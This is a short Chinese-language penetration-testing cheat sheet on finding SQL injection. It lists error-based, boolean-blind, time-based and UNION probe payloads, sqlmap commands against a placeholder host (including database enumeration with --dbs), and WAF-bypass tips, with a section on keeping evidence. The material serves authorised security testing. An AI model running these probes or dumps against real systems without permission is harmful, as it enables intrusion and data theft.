# SQL 注入（SQLi）快速测试要点

## 适用场景
- 发现可疑参数（id/search/filter/sort 等）或表单输入
- 页面存在数据库报错/响应差异/延迟异常

## 推荐流程（从低风险到高风险）
### 1) 识别输入点
- URL 参数、POST 数据、Cookie、HTTP Header（UA、XFF、Referer）
- 记录每个输入点的“原始请求/响应”，作为对照基线

### 2) 快速探测（手工）
- 报错型：`'` / `"` / `)` / `')`（观察 500/SQL 错误堆栈）
- 布尔盲注：`AND 1=1` vs `AND 1=2`（观察响应差异）
- 时间盲注：MySQL `SLEEP(5)`、PostgreSQL `pg_sleep(5)`（观察延迟）
- 联合查询探测：`UNION SELECT NULL...`（观察是否可控回显）

### 3) 定位数据库类型（常用线索）
- 报错信息关键字（MySQL/PostgreSQL/MSSQL/Oracle）
- 响应 Header、框架/ORM 特征、默认错误页样式

### 4) 工具化验证（sqlmap 优先）
```bash
# 基础
sqlmap -u "http://target.tld/page?id=1" --batch

# POST
sqlmap -u "http://target.tld/page" --data="id=1&x=1" --batch

# 指定参数
sqlmap -u "http://target.tld/page?id=1&x=1" -p id --batch

# 拉取库/表/数据（授权环境）
sqlmap -u "http://target.tld/page?id=1" --dbs --batch
```

## 绕过提示（授权环境）
- 编码：URL 编码/双重编码
- 关键字变形：大小写、注释、空白替换
- Header 注入：在会被写入日志/审计的字段中测试（配合证据）

## 证据留存
- 完整请求/响应（含参数与 Header）
- 可复现 PoC（最小 payload）
- 若为盲注，记录可观测指标（差异点/延迟）
